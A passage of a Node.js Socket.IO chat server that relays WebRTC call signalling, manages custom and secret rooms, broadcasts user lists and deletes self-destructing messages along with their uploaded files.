          username: 'AetherAI Bot',
          text: `${username} left the chat`,
          timestamp: new Date().toISOString(),
          system: true
        });
        sendRoomUsers(room);
      }

      // Update global users sidebar state
      sendGlobalUsers();
    }
  });

  // 7. WebRTC Signaling Relays
  socket.on('call-user', ({ to, offer, type }) => {
    io.to(to).emit('incoming-call', {
      from: socket.id,
      username: users.get(socket.id)?.username || 'Guest',
      offer: offer,
      type: type
    });
  });

  socket.on('make-answer', ({ to, answer }) => {
    io.to(to).emit('call-accepted', {
      from: socket.id,
      answer: answer
    });
  });

  socket.on('ice-candidate', ({ to, candidate }) => {
    io.to(to).emit('ice-candidate', {
      from: socket.id,
      candidate: candidate
    });
  });

  socket.on('track-changed', ({ to }) => {
    io.to(to).emit('track-changed');
  });

  socket.on('reject-call', ({ to }) => {

    io.to(to).emit('call-rejected', {
      from: socket.id
    });
  });

  socket.on('end-call', ({ to }) => {
    io.to(to).emit('call-ended', {
      from: socket.id
    });
  });

  // Create Custom Room
  socket.on('create-room', ({ room, isSecret }) => {
    if (!room) return;
    const trimmed = room.trim();
    if (trimmed.length > 0) {
      if (!messageHistory.has(trimmed)) {
        messageHistory.set(trimmed, []);
      }
      if (!isSecret && !activeRooms.has(trimmed)) {
        activeRooms.add(trimmed);
        io.emit('rooms-list', Array.from(activeRooms));
      }
    }
  });


  // Delete Custom Room
  socket.on('delete-room', ({ room }) => {
    if (room === 'AetherAIFree General') return;
    if (activeRooms.has(room)) {
      activeRooms.delete(room);
      messageHistory.delete(room);
      roomSelfDestructTimers.delete(room);
      
      io.emit('rooms-list', Array.from(activeRooms));

      // Redirect connected clients back to AetherAIFree General lobby
      users.forEach((value, key) => {
        if (value.room === room) {
          io.to(key).emit('force-lobby-redirect', { room });
        }
      });
    }
  });
});

// Helper to compile global users and emit update
function sendGlobalUsers() {
  const list = Array.from(persistentUsers.values()).map(u => ({
    username: u.username,
    status: u.status,
    lastSeen: u.lastSeen,
    id: u.socketId
  }));
  io.emit('global-users', list);
}

// Helper to get all users in a specific room and emit to that room
function sendRoomUsers(room) {
  const roomUsers = [];
  users.forEach((value, key) => {
    if (value.room === room) {
      roomUsers.push({
        id: key,
        username: value.username
      });
    }
  });
  io.to(room).emit('room-users', {
    room: room,
    users: roomUsers
  });
}

// Background loop to prune self-destructing messages (runs every 3 seconds)
setInterval(() => {
  const now = Date.now();
  messageHistory.forEach((history, room) => {
    const expiredIds = [];
    const activeMessages = [];

    history.forEach(msg => {
      if (msg.selfDestructAt && new Date(msg.selfDestructAt).getTime() < now) {
        expiredIds.push(msg.id);
        // If it contains a file, delete it from disk!
        if (msg.file && msg.file.url) {
          const filename = msg.file.url.split('/').pop();
          const filePath = path.join(UPLOADS_DIR, filename);
          fs.unlink(filePath, (err) => {
            if (err) console.log(`Self-destruct file unlink error:`, err.message);
            else console.log(`Expired message file deleted: ${filename}`);
          });
        }
      } else {
        activeMessages.push(msg);
      }
    });

    if (expiredIds.length > 0) {
      messageHistory.set(room, activeMessages);
      
      // Notify clients of deletion triggers
      if (room.startsWith('dm:')) {
        const parts = room.split(':');
        io.to(`user:${parts[1]}`).to(`user:${parts[2]}`).emit('messages-deleted', { room, ids: expiredIds });
      } else {
        io.to(room).emit('messages-deleted', { room, ids: expiredIds });
      }
    }
  });
}, 3000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
